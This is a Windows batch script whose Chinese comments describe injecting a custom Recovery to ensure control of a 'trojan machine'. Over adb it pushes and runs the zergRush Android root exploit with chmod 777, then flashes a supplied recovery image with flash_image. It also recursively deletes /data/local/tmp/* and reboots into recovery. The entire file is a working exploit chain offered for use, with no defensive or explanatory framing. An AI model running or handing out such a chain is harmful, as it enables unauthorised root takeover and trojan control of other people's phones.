@echo off
echo 注入Recovery的另一种刷法，确保木马机掌控成功
echo =====正在复制zergRush文件=====
adb push zergRush /data/local/zergRush
echo ====正在清除临时文件====
adb shell rm -r /data/local/tmp/*
echo ====正在修改zergRush权限并执行====
adb shell chmod 777 /data/local/zergRush
adb shell /data/local/zergRush
echo ====请等待20秒，程序在执行中====
ping /n 1 /w 20000 1.0.0.1>nul
echo ====正在复制刷新文件====
adb push flash_image /data/flash_image
adb push %1 /data/recovery.img
echo ====正在刷入第三方RECOVERY====
adb shell chmod 777 /data/flash_image
adb shell /data/flash_image recovery /data/recovery.img
echo ====正在删临时使用的recovery.img====
adb shell rm -r /data/recovery.img
echo ====重启至RECOVBERY模式====
echo ====......工作完毕......====
adb shell reboot recovery
@echo off
pause